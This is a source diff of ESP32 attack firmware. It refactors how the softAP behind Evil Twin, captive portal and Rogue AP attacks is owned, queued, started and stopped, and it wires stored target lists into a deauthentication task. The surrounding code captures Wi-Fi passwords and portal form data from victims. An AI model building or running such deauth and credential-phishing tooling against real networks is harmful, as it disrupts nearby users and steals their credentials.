@@ -9,6 +9,7 @@
 #include "esp_timer.h"
 #include "esp_http_server.h"
 #include "esp_attr.h"
+#include "esp_heap_caps.h"
 #include "esp_mac.h"
 #include "lwip/sockets.h"
 #include "lwip/netdb.h"
@@ -55,6 +56,12 @@ static httpd_handle_t portal_server = NULL;
 static volatile bool portal_active = false;
 static TaskHandle_t dns_server_task_handle = NULL;
 static int dns_server_socket = -1;
+
+static bool dns_run;
+static bool dns_exited = true;
+static bool ap_evil_handler_owned;
+static bool ap_portal_handler_owned;
+static uint32_t ap_event_inflight;
 
 // Evil Twin state
 static char evilTwinSSID[33] = "";
@@ -136,7 +143,7 @@ static portMUX_TYPE blackout_stats_spin = portMUX_INITIALIZER_UNLOCKED;
 
 // Forward declarations for portal services used across sections
 static esp_err_t start_portal_services(void);
-static void stop_portal_services(void);
+static esp_err_t stop_portal_services(void);
 static esp_err_t portal_submit_handler(httpd_req_t *req);
 static esp_err_t portal_handler(httpd_req_t *req);
 static esp_err_t get_handler(httpd_req_t *req);
@@ -149,26 +156,9 @@ static void save_evil_twin_password(const char* ssid, const char* password);
 static void save_portal_data(const char* ssid, const char* form_data);
 static void save_karma_data(const char* ssid, const char* form_data);
 
-/* ============================================================================
- * Package B (base v3.0.44): softAP attack-owner request/result ownership core.
- *
- * Pure, side-effect-free lifecycle logic for suspend/resume of the attack-owned
- * softAP (Evil Twin / Portal / Rogue). NO esp_wifi / RTOS calls live here on
- * purpose: this layer only decides state, so it is host-extractable and
- * ASan/UBSan-testable (tests/run_ap_owner_lifecycle_host.py). The functions are
- * not yet wired into the start/stop paths (that is Package B slice 2), so they
- * carry __attribute__((unused)); adding them changes no existing behaviour.
- *
- * Invariants enforced here (from the Package B design review):
- *   - One IMMUTABLE request snapshot, built overlap-safe (resume may feed a
- *     saved buffer straight back as the input) and bounds/null-checked.
- *   - A failed STOP leaves the AP live/uncertain (AP_OWN_LIVE_UNCERTAIN), never
- *     "held".
- *   - A failed RESUME stays failed (AP_OWN_ERROR) with the request retained,
- *     never reported as broadcasting.
- *   - Back/Home/radio-reset/replacement bump the generation and drop any
- *     in-flight result scheduled under the old generation (no resurrection).
- * ========================================================================== */
+/* Package B softAP lifecycle by co-developer @birolt29.
+ * JimGat integration: checked resources, serialized admission and cancellation.
+ * Host decision tests are not SDK/concurrency or physical RF acceptance. */
 /* >>> CYM_AP_OWNER_TYPES_BEGIN (extracted verbatim by tests/run_ap_owner_lifecycle_host.py) */
 typedef enum { AP_REQ_NONE = 0, AP_REQ_EVIL_TWIN, AP_REQ_PORTAL, AP_REQ_ROGUE } ap_req_kind_t;
 typedef enum {
@@ -200,21 +190,27 @@ typedef struct {
 /* Build an immutable request snapshot. Overlap-safe: ssid/pass may alias *out
  * (a resume can pass the saved snapshot's own buffers back in). Validates null,
  * byte length and (for Rogue) a non-empty password and a legal channel. */
-static __attribute__((unused)) int ap_snapshot_build(ap_req_snapshot_t *out, int kind,
+static int ap_snapshot_build(ap_req_snapshot_t *out, int kind,
                                                       const char *ssid, const char *pass,
                                                       const uint8_t *bssid, int channel,
                                                       int has_target, uint32_t generation) {
     if (!out) return AP_SNAP_ENULL;
+    if (kind < AP_REQ_EVIL_TWIN || kind > AP_REQ_ROGUE) return AP_SNAP_ENULL;
+    if ((has_target != 0 && has_target != 1) || (has_target && !bssid) || (!has_target && bssid)) return AP_SNAP_ENULL;
     if ((kind == AP_REQ_EVIL_TWIN || kind == AP_REQ_ROGUE) && !ssid) return AP_SNAP_ENULL;
     if (kind == AP_REQ_ROGUE && (!pass || pass[0] == '\0')) return AP_SNAP_EPASS;
-    if (channel < 0 || channel > 177) return AP_SNAP_ECHAN;  /* 2.4GHz 1-14 + 5GHz up to 177 (C5) */
+    /* Zero deliberately retains the normal channel-1 default. SDK set_config
+     * additionally validates actual target/band/country admission. */
+    if (channel < 0 || channel > 177 || (channel > 14 &&
+        !((channel >= 36 && channel <= 144 && channel % 4 == 0) ||
+          (channel >= 149 && (channel - 149) % 4 == 0)))) return AP_SNAP_ECHAN;
 
     char tssid[33];
     char tpass[64];
     size_t sn = ssid ? strnlen(ssid, sizeof(tssid)) : 0;
-    if (sn >= sizeof(tssid)) return AP_SNAP_ESSID;      /* 33+ bytes: no room for NUL */
+    if (sn == 0 || sn >= sizeof(tssid)) return AP_SNAP_ESSID;
     size_t pn = pass ? strnlen(pass, sizeof(tpass)) : 0;
-    if (pn >= sizeof(tpass)) return AP_SNAP_EPASS;       /* 64+ bytes */
+    if (pn >= sizeof(tpass) || (pn && pn < 8)) return AP_SNAP_EPASS;
 
     /* Copy inputs into stack temporaries BEFORE touching *out, so an input that
      * aliases *out is read before it is overwritten. */
@@ -223,7 +219,11 @@ static __attribute__((unused)) int ap_snapshot_build(ap_req_snapshot_t *out, int
     if (pn) memcpy(tpass, pass, pn);
     tpass[pn] = '\0';
     uint8_t tb[6] = {0};
-    if (bssid && has_target) memcpy(tb, bssid, 6);
+    if (bssid && has_target) {
+        memcpy(tb, bssid, 6);
+        const uint8_t zero[6] = {0};
+        if ((tb[0] & 1) || memcmp(tb, zero, 6) == 0) return AP_SNAP_ENULL;
+    }
 
     memset(out, 0, sizeof(*out));
     out->kind = (ap_req_kind_t)kind;
@@ -237,7 +237,7 @@ static __attribute__((unused)) int ap_snapshot_build(ap_req_snapshot_t *out, int
 }
 
 /* A new owner takes the AP: bump the generation and store the snapshot. */
-static __attribute__((unused)) ap_own_state_t ap_owner_begin(ap_owner_t *o, const ap_req_snapshot_t *snap) {
+static ap_own_state_t ap_owner_begin(ap_owner_t *o, const ap_req_snapshot_t *snap) {
     o->generation++;
     o->req = *snap;
     o->state = AP_OWN_ACTIVE;
@@ -246,18 +246,18 @@ static __attribute__((unused)) ap_own_state_t ap_owner_begin(ap_owner_t *o, cons
 
 /* Suspend completion. stop_ok = the stop primitive CONFIRMED the AP stopped.
  * A result carrying a stale generation is dropped (no change). */
-static __attribute__((unused)) ap_own_state_t ap_owner_suspend_result(ap_owner_t *o, uint32_t captured_gen, int stop_ok) {
+static ap_own_state_t ap_owner_suspend_result(ap_owner_t *o, uint32_t captured_gen, int stop_ok) {
     if (captured_gen != o->generation) return o->state;   /* stale suspend: drop */
-    if (o->state != AP_OWN_ACTIVE && o->state != AP_OWN_SUSPENDING) return o->state;
+    if (o->state != AP_OWN_ACTIVE && o->state != AP_OWN_SUSPENDING && o->state != AP_OWN_LIVE_UNCERTAIN) return o->state;
     o->state = stop_ok ? AP_OWN_HELD : AP_OWN_LIVE_UNCERTAIN;
     return o->state;                                       /* request retained either way */
 }
 
 /* Resume completion. start_ok = the start primitive CONFIRMED broadcasting.
  * A result carrying a stale generation is dropped (no change). */
-static __attribute__((unused)) ap_own_state_t ap_owner_resume_result(ap_owner_t *o, uint32_t captured_gen, int start_ok) {
+static ap_own_state_t ap_owner_resume_result(ap_owner_t *o, uint32_t captured_gen, int start_ok) {
     if (captured_gen != o->generation) return o->state;   /* stale completion: drop */
-    if (o->state != AP_OWN_HELD && o->state != AP_OWN_RESUMING) return o->state;
+    if (o->state != AP_OWN_HELD && o->state != AP_OWN_RESUMING && o->state != AP_OWN_ERROR) return o->state;
     o->state = start_ok ? AP_OWN_ACTIVE : AP_OWN_ERROR;
     return o->state;                                       /* request retained on ERROR */
 }
@@ -274,14 +274,7 @@ static __attribute__((unused)) int ap_owner_can_resume(const ap_owner_t *o, uint
     return o->state == AP_OWN_HELD && captured_gen == o->generation && o->req.kind != AP_REQ_NONE;
 }
 
-/* ---- Package B slice 2: bounded request queue + off-UI dispatch ----------
- * The UI task never runs the (multi-second, blocking) AP stop/start work. It
- * SCHEDULES an op (capturing the generation) and enqueues it; a single worker
- * (slice 3) pops one op at a time, runs the checked radio primitive, and feeds
- * the outcome back through ap_owner_dispatch(), which honours the generation
- * captured at enqueue time — so a completion that lands after Back/Home/reset
- * (invalidate) is reconciled away instead of resurrecting a departed owner.
- * These remain pure and __attribute__((unused)) until slice 3 wires the task. */
+/* Bounded host-extractable request queue. Runtime admission is atomic. */
 /* >>> CYM_AP_QUEUE_TYPES_BEGIN (extracted verbatim by tests/run_ap_owner_queue_host.py) */
 #define AP_REQQ_CAP 4
 typedef enum { AP_OP_NONE = 0, AP_OP_SUSPEND, AP_OP_RESUME } ap_owner_op_t;
@@ -291,7 +284,7 @@ typedef struct { ap_req_t slots[AP_REQQ_CAP]; uint8_t head; uint8_t tail; uint8_
 
 /* Enqueue one op. Rejects (returns 0) when full: no overwrite, no fabricated
  * success, no unbounded growth. */
-static __attribute__((unused)) int ap_reqq_push(ap_reqq_t *q, ap_owner_op_t op, uint32_t generation) {
+static int ap_reqq_push(ap_reqq_t *q, ap_owner_op_t op, uint32_t generation) {
     if (q->count >= AP_REQQ_CAP) return 0;
     q->slots[q->tail].op = op;
     q->slots[q->tail].generation = generation;
@@ -300,7 +293,7 @@ static __attribute__((unused)) int ap_reqq_push(ap_reqq_t *q, ap_owner_op_t op, 
     return 1;
 }
 
-static __attribute__((unused)) int ap_reqq_pop(ap_reqq_t *q, ap_req_t *out) {
+static int ap_reqq_pop(ap_reqq_t *q, ap_req_t *out) {
     if (q->count == 0) return 0;
     *out = q->slots[q->head];
     q->head = (uint8_t)((q->head + 1) % AP_REQQ_CAP);
@@ -318,148 +311,243 @@ static __attribute__((unused)) uint32_t ap_owner_schedule(ap_owner_t *o, ap_owne
 
 /* Reconcile a completed primitive into the owner, using the generation captured
  * when the op was enqueued (NOT the current one). */
-static __attribute__((unused)) ap_own_state_t ap_owner_dispatch(ap_owner_t *o, const ap_req_t *r, int primitive_ok) {
+static ap_own_state_t ap_owner_dispatch(ap_owner_t *o, const ap_req_t *r, int primitive_ok) {
     if (r->op == AP_OP_SUSPEND) return ap_owner_suspend_result(o, r->generation, primitive_ok);
     if (r->op == AP_OP_RESUME)  return ap_owner_resume_result(o, r->generation, primitive_ok);
     return o->state;
 }
 /* ===================== end Package B ownership core ====================== */
 
-/* ---- Package B slice 3b-1: checked radio primitives + off-UI worker --------
- * The single attack-owned-AP state, its request queue and a worker task that
- * runs the (multi-second, blocking) stop/start work OFF the LVGL task. The UI
- * only SCHEDULES suspend/resume (wifi_attacks_ap_suspend/_resume), which enqueue
- * under the mutex and wake the worker; the worker runs the primitive outside the
- * mutex and dispatches the generation-checked result back in. Nothing here is
- * called yet by the start paths or the UI (slice 3b-2 wires those and is the
- * first behaviour change -> on-device RF verification), so the worker is created
- * lazily and never spawns until a request arrives: adding this is zero-regression. */
-// Heap-allocated lazily so the classic ESP32 (tight DRAM) keeps only a pointer in
-// .bss (the static owner+queue overflowed classic-ESP32 dram0 by 72 bytes).
-typedef struct { ap_owner_t own; ap_reqq_t q; } ap_ctx_t;
-static ap_ctx_t        *s_apctx = NULL;
-static SemaphoreHandle_t s_ap_mtx  = NULL;
-static SemaphoreHandle_t s_ap_wake = NULL;
-static TaskHandle_t      s_ap_task = NULL;
-
-/* Really drop the attack-owned AP: stop its services, then go STA-only (the
- * same "truly down" transition radio_reset_to_idle() performs for the portal),
- * and confirm. Returns ESP_OK only when the AP is confirmed down. */
-static esp_err_t ap_suspend_primitive(ap_req_kind_t kind) {
-    if (kind == AP_REQ_EVIL_TWIN) wifi_attacks_stop_evil_twin();
-    else                          wifi_attacks_stop_portal();   /* portal + rogue */
-    esp_wifi_set_mode(WIFI_MODE_STA);
-    wifi_mode_t m;
-    if (esp_wifi_get_mode(&m) != ESP_OK) return ESP_FAIL;
-    return (m == WIFI_MODE_STA && !portal_active) ? ESP_OK : ESP_FAIL;
+/* >>> CYM_AP_ADMIT_TYPES_BEGIN */
+typedef enum { AP_ADMIT_OK = 0, AP_ADMIT_REFUSE_UTILITY } ap_admit_t;
+/* <<< CYM_AP_ADMIT_TYPES_END */
+static ap_admit_t ap_admit(int brings_up_ap, int utility_ap_owned, int handoff) {
+    if (brings_up_ap && utility_ap_owned && !handoff) return AP_ADMIT_REFUSE_UTILITY;
+    return AP_ADMIT_OK;
 }
 
-/* Resume from the immutable snapshot. Copy into locals first: the start_*
- * entries strncpy into their own globals, so we never pass a buffer they write. */
-static esp_err_t ap_resume_primitive(const ap_req_snapshot_t *s) {
-    char ssid[33];
-    char pass[64];
-    memcpy(ssid, s->ssid, sizeof(ssid));
-    memcpy(pass, s->pass, sizeof(pass));
-    switch (s->kind) {
-        case AP_REQ_EVIL_TWIN: return wifi_attacks_start_evil_twin(ssid, pass[0] ? pass : NULL);
-        case AP_REQ_PORTAL:    return wifi_attacks_start_portal(ssid);
-        case AP_REQ_ROGUE:     return wifi_attacks_start_rogue_ap(ssid, pass,
-                                       s->has_target ? s->bssid : NULL, s->channel);
-        default:               return ESP_FAIL;
-    }
+/* Shared AP/STA reservation: 1 attack lifetime, 2 Clock, 3 file transfer,
+ * 4 reset. Retained until checked release, including failed/partial starts.
+ * Spinlock protects only bounded state copies, never SDK, heap or RTOS waits. */
+typedef struct {
+    ap_owner_t own;
+    ap_reqq_t q;
+    bool cancelled;
+    bool inflight;
+    bool radio_touched;
+    esp_err_t error;
+    esp_err_t cleanup_error;
+    target_bssid_t targets[MAX_TARGET_BSSIDS];
+    int target_count;
+    TaskHandle_t task;
+} ap_ctx_t;
+static ap_ctx_t *s_apctx;
+static portMUX_TYPE s_ap_spin = portMUX_INITIALIZER_UNLOCKED;
+static bool s_ap_initializing;
+static int s_ap_radio_owner;
+static bool (*s_utility_ap_cb)(void);
+static esp_err_t ap_start_owned(const ap_req_snapshot_t *snap);
+static esp_err_t ap_stop_owned(void);
+static void ap_owner_worker(void *arg);
+
+bool wifi_attacks_radio_claim(int owner) {
+    if (owner < 2 || owner > 4) return false;
+    portENTER_CRITICAL(&s_ap_spin);
+    bool ok = s_ap_radio_owner == 0;
+    if (ok) s_ap_radio_owner = owner;
+    portEXIT_CRITICAL(&s_ap_spin);
+    return ok;
+}
+void wifi_attacks_radio_release(int owner) {
+    portENTER_CRITICAL(&s_ap_spin);
+    if (s_ap_radio_owner == owner) s_ap_radio_owner = 0;
+    portEXIT_CRITICAL(&s_ap_spin);
 }
 
-static void ap_owner_worker(void *arg) {
-    (void)arg;
-    for (;;) {
-        xSemaphoreTake(s_ap_wake, portMAX_DELAY);
-        for (;;) {
-            ap_req_t req;
-            ap_req_kind_t kind;
-            int have;
-            xSemaphoreTake(s_ap_mtx, portMAX_DELAY);
-            have = ap_reqq_pop(&s_apctx->q, &req);
-            kind = s_apctx->own.req.kind;
-            xSemaphoreGive(s_ap_mtx);
-            if (!have) break;
-
-            int ok = 0;
-            if (req.op == AP_OP_SUSPEND) {
-                ok = (ap_suspend_primitive(kind) == ESP_OK);
-            } else if (req.op == AP_OP_RESUME) {
-                ap_req_snapshot_t snap;
-                xSemaphoreTake(s_ap_mtx, portMAX_DELAY);
-                snap = s_apctx->own.req;          /* immutable copy under the lock */
-                xSemaphoreGive(s_ap_mtx);
-                ok = (ap_resume_primitive(&snap) == ESP_OK);
-            }
-
-            xSemaphoreTake(s_ap_mtx, portMAX_DELAY);
-            ap_own_state_t st = ap_owner_dispatch(&s_apctx->own, &req, ok);
-            xSemaphoreGive(s_ap_mtx);
-            ESP_LOGI(TAG, "AP owner: op=%d ok=%d -> state=%d", (int)req.op, ok, (int)st);
-        }
-    }
-}
-
+/* Reserve all control/task memory BEFORE any hardware effects. A newly created
+ * worker first blocks on a notification: it never races creator publication.
+ * IDF dynamic task stack and TCB are internal; no external-stack fallback. */
 static int ap_ensure_worker(void) {
-    if (!s_apctx)   { s_apctx = calloc(1, sizeof(*s_apctx)); if (!s_apctx) return 0; }
-    if (!s_ap_mtx)  s_ap_mtx  = xSemaphoreCreateMutex();
-    if (!s_ap_wake) s_ap_wake = xSemaphoreCreateBinary();
-    if (!s_ap_mtx || !s_ap_wake) return 0;
-    if (!s_ap_task) {
-        if (xTaskCreate(ap_owner_worker, "ap_owner", 4096, NULL, 5, &s_ap_task) != pdPASS) {
-            s_ap_task = NULL;
-            return 0;
+    portENTER_CRITICAL(&s_ap_spin);
+    if (s_apctx) { portEXIT_CRITICAL(&s_ap_spin); return 1; }
+    if (s_ap_initializing) { portEXIT_CRITICAL(&s_ap_spin); return 0; }
+    s_ap_initializing = true;
+    portEXIT_CRITICAL(&s_ap_spin);
+    ap_ctx_t *ctx = heap_caps_calloc(1, sizeof(*ctx), MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
+    bool ok = ctx && xTaskCreate(ap_owner_worker, "ap_owner", 4096, ctx, 5, &ctx->task) == pdPASS;
+    portENTER_CRITICAL(&s_ap_spin);
+    if (ok) s_apctx = ctx;
+    s_ap_initializing = false;
+    portEXIT_CRITICAL(&s_ap_spin);
+    if (!ok) free(ctx);
+    return ok;
+}
+
+/* One operation at a time; full/invalid/duplicate enqueue has NO state effect.
+ * Generation is the owner lifetime, never bumped by suspend/resume. */
+static esp_err_t ap_enqueue(ap_owner_op_t op) {
+    if (!ap_ensure_worker()) return ESP_ERR_NO_MEM;
+    portENTER_CRITICAL(&s_ap_spin);
+    ap_ctx_t *c = s_apctx;
+    bool valid = !c->cancelled && c->own.req.kind != AP_REQ_NONE &&
+        ((op == AP_OP_SUSPEND && (c->own.state == AP_OWN_ACTIVE || c->own.state == AP_OWN_LIVE_UNCERTAIN)) ||
+         (op == AP_OP_RESUME && (c->own.state == AP_OWN_HELD || c->own.state == AP_OWN_ERROR)));
+    esp_err_t rc = ESP_ERR_INVALID_STATE;
+    if (op == AP_OP_SUSPEND && c->cancelled && !c->inflight &&
+        c->own.state == AP_OWN_LIVE_UNCERTAIN && s_ap_radio_owner == 1) {
+        c->own.state = AP_OWN_SUSPENDING;
+        rc = ESP_OK; /* explicit retry of retired-owner checked cleanup */
+    } else if (valid && !c->inflight && c->q.count == 0) {
+        if (ap_reqq_push(&c->q, op, c->own.generation)) {
+            c->own.state = op == AP_OP_SUSPEND ? AP_OWN_SUSPENDING : AP_OWN_RESUMING;
+            rc = ESP_OK;
+        } else rc = ESP_ERR_NO_MEM;
+    }
+    TaskHandle_t task = c->task;
+    portEXIT_CRITICAL(&s_ap_spin);
+    if (rc == ESP_OK) xTaskNotifyGive(task);
+    return rc;
+}
+esp_err_t wifi_attacks_ap_suspend(void) { return ap_enqueue(AP_OP_SUSPEND); }
+esp_err_t wifi_attacks_ap_resume(void) { return ap_enqueue(AP_OP_RESUME); }
+
+void wifi_attacks_set_utility_ap_cb(bool (*cb)(void)) {
+    portENTER_CRITICAL(&s_ap_spin); s_utility_ap_cb = cb; portEXIT_CRITICAL(&s_ap_spin);
+}
+
+static esp_err_t ap_request_start(int kind, const char *ssid, const char *pass,
+                                   const uint8_t *bssid, int channel) {
+    ap_req_snapshot_t snap;
+    if (ap_snapshot_build(&snap, kind, ssid, pass, bssid, channel, bssid != NULL, 0) != AP_SNAP_OK)
+        return ESP_ERR_INVALID_ARG;
+    if (!ap_ensure_worker()) return ESP_ERR_NO_MEM;
+    target_bssid_t *targets = NULL;
+    int target_count = 0;
+    if (kind == AP_REQ_EVIL_TWIN) {
+        targets = heap_caps_calloc(MAX_TARGET_BSSIDS, sizeof(*targets), MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
+        if (!targets) return ESP_ERR_NO_MEM;
+        wifi_scanner_save_target_bssids();
+        target_count = wifi_scanner_get_targets(targets, MAX_TARGET_BSSIDS);
+    }
+    /* No callback is NOT permission. Live utilities acquire the same reservation
+     * before their first Wi-Fi call, including STA-only and pending startup. */
+    portENTER_CRITICAL(&s_ap_spin);
+    bool (*query)(void) = s_utility_ap_cb;
+    portEXIT_CRITICAL(&s_ap_spin);
+    if (ap_admit(1, !query || query(), 0) != AP_ADMIT_OK) { free(targets); return ESP_ERR_INVALID_STATE; }
+    portENTER_CRITICAL(&s_ap_spin);
+    ap_ctx_t *c = s_apctx;
+    if (s_ap_radio_owner || c->inflight || c->q.count || c->own.state != AP_OWN_IDLE) {
+        portEXIT_CRITICAL(&s_ap_spin); free(targets); return ESP_ERR_INVALID_STATE;
+    }
+    s_ap_radio_owner = 1;
+    c->cancelled = false;
+    ap_owner_begin(&c->own, &snap);
+    c->own.req.generation = c->own.generation;
+    c->own.state = AP_OWN_RESUMING;
+    c->error = ESP_OK;
+    c->cleanup_error = ESP_OK;
+    c->target_count = target_count;
+    if (target_count) memcpy(c->targets, targets, target_count * sizeof(*targets));
+    if (snap.has_target) {
+        c->target_count = 1;
+        memset(&c->targets[0], 0, sizeof(c->targets[0]));
+        memcpy(c->targets[0].bssid, snap.bssid, 6);
+        memcpy(c->targets[0].ssid, snap.ssid, sizeof(snap.ssid));
+        c->targets[0].channel = snap.channel ? snap.channel : 1;
+        c->targets[0].active = true;
+    }
+    /* Initial start uses the same immutable owned primitive as explicit resume. */
+    bool pushed = ap_reqq_push(&c->q, AP_OP_RESUME, c->own.generation);
+    TaskHandle_t task = c->task;
+    portEXIT_CRITICAL(&s_ap_spin);
+    free(targets);
+    if (!pushed) return ESP_ERR_NO_MEM; /* empty queue above, invariant */
+    xTaskNotifyGive(task);
+    return ESP_OK; /* admission, NOT confirmed active */
+}
+
+void wifi_attacks_ap_invalidate(void) {
+    portENTER_CRITICAL(&s_ap_spin);
+    ap_ctx_t *c = s_apctx;
+    TaskHandle_t task = NULL;
+    if (c && s_ap_radio_owner == 1) {
+        ++c->own.generation;
+        c->cancelled = true;
+        c->q = (ap_reqq_t){0}; /* obsolete pending ops cannot touch hardware */
+        c->own.state = AP_OWN_SUSPENDING;
+        task = c->task;
+    }
+    portEXIT_CRITICAL(&s_ap_spin);
+    if (task) xTaskNotifyGive(task);
+}
+int wifi_attacks_ap_owner_state(void) {
+    portENTER_CRITICAL(&s_ap_spin);
+    int state = s_apctx ? (int)s_apctx->own.state : AP_OWN_IDLE;
+    portEXIT_CRITICAL(&s_ap_spin);
+    return state;
+}
+esp_err_t wifi_attacks_ap_last_error(void) {
+    portENTER_CRITICAL(&s_ap_spin);
+    esp_err_t error = s_apctx ? (s_apctx->error != ESP_OK ? s_apctx->error : s_apctx->cleanup_error) : ESP_OK;
+    portEXIT_CRITICAL(&s_ap_spin);
+    return error;
+}
+
+/* A single step is production-extractable for scheduled interleaving tests.
+ * Admission captures identity before any primitive; no replacement/reset/utility
+ * can acquire the physical reservation until checked obsolete-owner cleanup. */
+static bool ap_worker_step(ap_ctx_t *c) {
+    ap_req_t req = {0};
+    ap_req_snapshot_t snap;
+    portENTER_CRITICAL(&s_ap_spin);
+    bool cancel = c->cancelled;
+    bool have = !cancel && ap_reqq_pop(&c->q, &req);
+    bool valid = have && req.generation == c->own.generation && s_ap_radio_owner == 1;
+    if (!cancel && !valid) { portEXIT_CRITICAL(&s_ap_spin); return have; }
+    if (cancel && s_ap_radio_owner != 1) { portEXIT_CRITICAL(&s_ap_spin); return false; }
+    snap = c->own.req;
+    c->inflight = true;
+    portEXIT_CRITICAL(&s_ap_spin);
+
+    esp_err_t rc = ESP_OK, cleanup = ESP_OK;
+    if (cancel || req.op == AP_OP_SUSPEND) rc = ap_stop_owned();
+    else if (req.op == AP_OP_RESUME) {
+        /* ERROR may retain resources. Never start over a partial old instance. */
+        rc = ap_stop_owned();
+        if (rc == ESP_OK) {
+            rc = ap_start_owned(&snap);
+            if (rc != ESP_OK) {
+                cleanup = ap_stop_owned(); /* retain original acquisition error separately */
+            }
         }
     }
-    return 1;
+    portENTER_CRITICAL(&s_ap_spin);
+    bool retired = c->cancelled || (!cancel && req.generation != c->own.generation);
+    portEXIT_CRITICAL(&s_ap_spin);
+    if (retired && !cancel) cleanup = ap_stop_owned(); /* late success: checked owner-only cleanup */
+    portENTER_CRITICAL(&s_ap_spin);
+    c->inflight = false;
+    c->error = rc;
+    c->cleanup_error = cleanup;
+    if (retired) {
+        if ((cancel ? rc : cleanup) == ESP_OK) {
+            c->own.state = AP_OWN_IDLE; c->own.req.kind = AP_REQ_NONE;
+            c->cancelled = false; c->target_count = 0;
+            s_ap_radio_owner = 0;
+        } else c->own.state = AP_OWN_LIVE_UNCERTAIN;
+    } else ap_owner_dispatch(&c->own, &req, rc == ESP_OK && cleanup == ESP_OK);
+    portEXIT_CRITICAL(&s_ap_spin);
+    return !retired; /* no automatic failed-cleanup/retry loop */
 }
-
-static esp_err_t ap_enqueue(ap_owner_op_t op) {
-    if (!ap_ensure_worker()) return ESP_FAIL;
-    xSemaphoreTake(s_ap_mtx, portMAX_DELAY);
-    uint32_t g = ap_owner_schedule(&s_apctx->own, op);
-    int pushed = ap_reqq_push(&s_apctx->q, op, g);
-    xSemaphoreGive(s_ap_mtx);
-    if (!pushed) return ESP_ERR_NO_MEM;     /* queue full: rejected, not fabricated */
-    xSemaphoreGive(s_ap_wake);
-    return ESP_OK;
-}
-
-esp_err_t wifi_attacks_ap_suspend(void) { return ap_enqueue(AP_OP_SUSPEND); }
-esp_err_t wifi_attacks_ap_resume(void)  { return ap_enqueue(AP_OP_RESUME); }
-
-/* Called by the attack start paths (slice 3b-2) to register the current owner
- * with an immutable snapshot. Validates/copies; a bad request leaves no owner. */
-void wifi_attacks_ap_record_owner(int kind, const char *ssid, const char *pass,
-                                  const uint8_t *bssid, int channel, int has_target) {
-    if (!ap_ensure_worker()) return;
-    xSemaphoreTake(s_ap_mtx, portMAX_DELAY);
-    ap_req_snapshot_t snap;
-    if (ap_snapshot_build(&snap, kind, ssid, pass, bssid, channel, has_target, 0) == AP_SNAP_OK) {
-        ap_owner_begin(&s_apctx->own, &snap);
+static void ap_owner_worker(void *arg) {
+    ap_ctx_t *c = arg;
+    for (;;) {
+        ulTaskNotifyTake(pdTRUE, portMAX_DELAY);
+        while (ap_worker_step(c)) {}
     }
-    xSemaphoreGive(s_ap_mtx);
 }
 
-/* Back/Home/radio-reset/replacement: destroy resume eligibility of any owner. */
-void wifi_attacks_ap_invalidate(void) {
-    if (!s_ap_mtx) return;
-    xSemaphoreTake(s_ap_mtx, portMAX_DELAY);
-    ap_owner_invalidate(&s_apctx->own);
-    xSemaphoreGive(s_ap_mtx);
-}
-
-int wifi_attacks_ap_owner_state(void) {
-    if (!s_ap_mtx) return (int)AP_OWN_IDLE;
-    xSemaphoreTake(s_ap_mtx, portMAX_DELAY);
-    int st = (int)s_apctx->own.state;
-    xSemaphoreGive(s_ap_mtx);
-    return st;
-}
-/* ================= end Package B slice 3b-1 mechanism ==================== */
 static void url_decode(const char* src, char* dst, size_t dst_size);
 static void deauth_attack_task(void *pvParameters);
 
@@ -587,7 +675,12 @@ static const uint8_t deauth_frame_template[] = {
 static void deauth_attack_task(void *pvParameters) {
     uint8_t deauth_frame[sizeof(deauth_frame_template)];
     target_bssid_t targets[MAX_TARGET_BSSIDS];
-    int target_count = wifi_scanner_get_targets(targets, MAX_TARGET_BSSIDS);
+    int target_count;
+    if (pvParameters) {
+        ap_ctx_t *owner = pvParameters;
+        target_count = owner->target_count;
+        memcpy(targets, owner->targets, target_count * sizeof(*targets));
+    } else target_count = wifi_scanner_get_targets(targets, MAX_TARGET_BSSIDS);
     
     if (target_count == 0) {
         ESP_LOGW(TAG, "No targets selected");
@@ -687,6 +780,10 @@ static void deauth_attack_task(void *pvParameters) {
 }
 
 esp_err_t wifi_attacks_start_deauth(void) {
+    portENTER_CRITICAL(&s_ap_spin);
+    bool busy = s_ap_radio_owner != 0;
+    portEXIT_CRITICAL(&s_ap_spin);
+    if (busy) return ESP_ERR_INVALID_STATE;
     if (deauth_attack_active) {
         ESP_LOGW(TAG, "Deauth attack already running");
         return ESP_ERR_INVALID_STATE;
@@ -736,6 +833,10 @@ esp_err_t wifi_attacks_start_deauth(void) {
 }
 
 esp_err_t wifi_attacks_stop_deauth(void) {
+    portENTER_CRITICAL(&s_ap_spin);
+    bool owned = s_ap_radio_owner == 1;
+    portEXIT_CRITICAL(&s_ap_spin);
+    if (owned) { wifi_attacks_ap_invalidate(); return ESP_OK; }
     if (!deauth_attack_active) {
         return ESP_ERR_INVALID_STATE;
     }
@@ -762,6 +863,7 @@ bool wifi_attacks_is_deauth_active(void) {
 
 static void portal_event_handler(void *arg, esp_event_base_t event_base,
                                  int32_t event_id, void *event_data) {
+    if (!__atomic_load_n(&portal_active, __ATOMIC_ACQUIRE)) return;
     if (event_base == WIFI_EVENT) {
         if (event_id == WIFI_EVENT_AP_STACONNECTED) {
             wifi_event_ap_staconnected_t *event = (wifi_event_ap_staconnected_t *)event_data;
@@ -791,7 +893,7 @@ static void portal_event_handler(void *arg, esp_event_base_t event_base,
 // EVIL TWIN ATTACK
 // ============================================================================
 
-static void evil_twin_event_handler(void *arg, esp_event_base_t event_base,
+static void evil_twin_event_handler_impl(void *arg, esp_event_base_t event_base,
                                     int32_t event_id, void *event_data) {
     if (event_base == WIFI_EVENT) {
         if (event_id == WIFI_EVENT_AP_STACONNECTED) {
@@ -810,7 +912,7 @@ static void evil_twin_event_handler(void *arg, esp_event_base_t event_base,
             emit_evil_twin_event(EVIL_TWIN_EVENT_CLIENT_DISCONNECTED, evilTwinSSID, NULL);
         } else if (event_id == WIFI_EVENT_STA_CONNECTED) {
             // Password verification succeeded
-            ESP_LOGI(TAG, "Password verified successfully: %s", evilTwinPassword);
+            ESP_LOGI(TAG, "Password verified successfully");
             last_password_wrong = false;
             password_verification_in_progress = false;
             
@@ -846,7 +948,7 @@ static void evil_twin_event_handler(void *arg, esp_event_base_t event_base,
                             deauth_attack_task,
                             "deauth_attack",
                             8192,  // Same stack size as normal start
-                            NULL,
+                            s_apctx,
                             3,     // Same priority as normal start
                             &deauth_attack_task_handle
                         );
@@ -865,189 +967,26 @@ static void evil_twin_event_handler(void *arg, esp_event_base_t event_base,
     }
 }
 
-/* Package B (#3): utility-AP admission. The host app registers a query that
- * reports whether a utility softAP (NTP / file server) currently owns the shared
- * AP interface; an attack AP bring-up is refused while one does, so an attack
